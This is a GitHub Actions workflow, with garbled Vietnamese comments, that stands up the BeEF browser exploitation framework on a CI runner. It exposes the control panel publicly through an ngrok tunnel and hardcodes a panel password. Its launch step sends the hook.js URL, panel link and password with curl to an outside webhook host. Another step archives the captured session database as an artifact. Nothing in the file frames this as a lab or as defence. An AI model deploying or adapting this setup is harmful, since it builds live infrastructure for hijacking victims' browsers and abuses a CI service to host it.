name: BeEF Ultimate Cloud Raw
on: [workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v3

      - name: Install Dependencies
        run: |
          sudo apt update
          sudo apt install -y ruby-full libsqlite3-dev jq curl
          git clone https://github.com/beefproject/beef.git
          cd beef
          bundle install

      - name: Install Ngrok
        run: |
          curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
          echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
          sudo apt update && sudo apt install ngrok

      - name: Configure and Launch
        env:
          NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
        run: |
          # 1. Thi·∫øt l·∫≠p Ngrok
          ngrok config add-authtoken $NGROK_AUTH_TOKEN
          ngrok http 3000 > /dev/null &
          sleep 15 # Ch·ªù Ngrok l·∫•y link ·ªïn ƒë·ªãnh

          # 2. L·∫•y Public URL t·ª´ Ngrok
          FULL_URL=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
          PUBLIC_HOST=$(echo $FULL_URL | sed 's/https:\/\///')

          # 3. C·∫•u h√¨nh BeEF
          cd beef
          sed -i 's/passwd: "beef"/passwd: "Giang_Vip_2026"/' config.yaml
          sed -i "s/#            host: \"beef.local\"/            host: \"$PUBLIC_HOST\"/" config.yaml
          sed -i "s/#            port: \"443\"/            port: \"443\"/" config.yaml
          sed -i "s/#            https: false/            https: true/" config.yaml
          sed -i "s/allow_reverse_proxy: false/allow_reverse_proxy: true/" config.yaml

          # 4. G·ª≠i th√¥ng tin th√¥ v·ªÅ Telegram Webhook
          # S·ª≠ d·ª•ng --data-urlencode ƒë·ªÉ tr√°nh l·ªói khi link c√≥ k√Ω t·ª± ƒë·∫∑c bi·ªát
          MSG="üöÄ BeEF ONLINE! Link Hook: $FULL_URL/hook.js | Panel: $FULL_URL/ui/panel | Pass: Giang_Vip_2026"
          curl -s -G "https://webhook1234.pythonanywhere.com/" --data-urlencode "data=$MSG"

          # 5. Kh·ªüi ƒë·ªông BeEF
          ./beef

      - name: Auto Backup Database
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: beef-session-data
          path: beef/beef.db
